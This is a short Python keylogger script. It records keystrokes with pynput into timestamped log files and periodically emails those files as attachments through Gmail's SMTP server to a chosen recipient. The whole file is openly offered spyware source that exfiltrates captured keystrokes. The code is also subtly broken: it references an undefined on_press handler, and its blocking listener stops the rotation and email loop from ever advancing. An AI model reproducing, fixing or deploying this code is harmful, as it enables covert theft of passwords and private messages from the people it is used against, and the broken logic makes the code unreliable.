import pynput
from pynput.keyboard import Key, Listener
import logging
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

log_dir = input("Enter the log file directory (e.g., C:/users/ASHHAR/): ")
log_file_prefix = "keyLog_"
log_file_extension = ".txt"
log_interval = 600  # 10 minutes in seconds
email_interval = 2  # Send email every 2 log files (20 minutes)

email_address = input("Enter your email address: ")
email_password = input("Enter your email password: ")
recipient_email = input("Enter the recipient's email address: ")

def get_current_time():
    return time.strftime("%Y-%m-%d_%H-%M-%S")

def create_new_log_file():
    new_log_file = f"{log_file_prefix}{get_current_time()}{log_file_extension}"
    logging.basicConfig(filename=(log_dir + new_log_file), level=logging.DEBUG, format='%(asctime)s: %(message)s')
    return new_log_file

def send_email(log_file):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = recipient_email
    msg['Subject'] = "Keylog Data"

    with open(log_file, "rb") as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f"attachment; filename={log_file}")
    msg.attach(part)

    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(email_address, email_password)
        server.sendmail(email_address, recipient_email, msg.as_string())

log_count = 0
while True:
    log_count += 1
    log_file = create_new_log_file()

    with Listener(on_press=on_press) as listener:
        listener.join()

    if log_count % email_interval == 0:
        send_email(log_file)
